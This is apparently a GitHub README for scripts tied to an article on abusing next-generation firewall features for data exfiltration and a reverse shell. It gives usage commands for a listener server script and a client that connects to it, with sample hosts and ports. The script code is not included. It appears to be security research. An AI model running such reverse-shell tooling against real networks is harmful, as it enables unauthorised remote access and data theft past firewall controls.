# When features turn into nightmares
## How threat actors can exploit NGFW features to exfiltrate data and establish a reverse shell

To run the experiments described in this [article](https://medium.com/@pllgiulio96/when-features-turn-into-nightmares-how-threat-actors-can-exploit-ngfw-features-to-exfiltrate-data-125e2f33372b) you can use the script available in this repository.
You must run firstly the script on the server, that opens a listener, and then the one on the client that connects to it.


## Server script

Usage:
>	python shell-server.py [-p \<PORT\> -b \<BUFFER_SIZE\>]

Examples:
>	python shell-server.py -p 44444 -b 50
  
>	python shell-server.py -p 44444 -b 50

Default values:
>	-p 33333 (must be the same of client)
  
>	-b 100 (must be the same of client)



## Client script

Usage:
>	python shell-client.py -s \<SERVER\> [-p \<PORT\> -b \<BUFFER_SIZE\>]

Example:
>	python shell-client.py -s 192.168.100.54 -p 44444 -b 50
  
>	python shell-client.py -s example.com -p 44444 -b 50

Default values:
>	-p 33333 (must be the same of server)

>	-b 100 (must be the same of server)






